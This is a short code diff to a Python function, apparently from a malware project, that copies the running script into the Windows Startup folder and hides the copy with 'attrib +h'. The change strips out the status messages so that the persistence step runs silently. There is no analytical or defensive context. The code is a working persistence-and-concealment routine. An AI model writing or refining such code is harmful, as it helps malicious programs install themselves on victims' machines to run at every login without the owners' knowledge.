@@ -44,17 +44,16 @@ def startup():
         src_path = sys.argv[0].replace("/", "\\")
         dst_path = fr"C:\Users\{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\{name}"
         if os.path.exists(dst_path):
-            return "It's already exists"
+            return
         else:
             try:
                 shutil.copy(src_path, dst_path)
                 try:
                     subprocess.check_call(["attrib", "+h", dst_path])
-                    return "Successfully copied (HIDDEN)"
                 except:
-                    return "Successfully copied (NOT HIDDEN)" 
+                    return
             except:
-                return "The copy was not successful"
+                return
 
 
 def decodeFile(path):
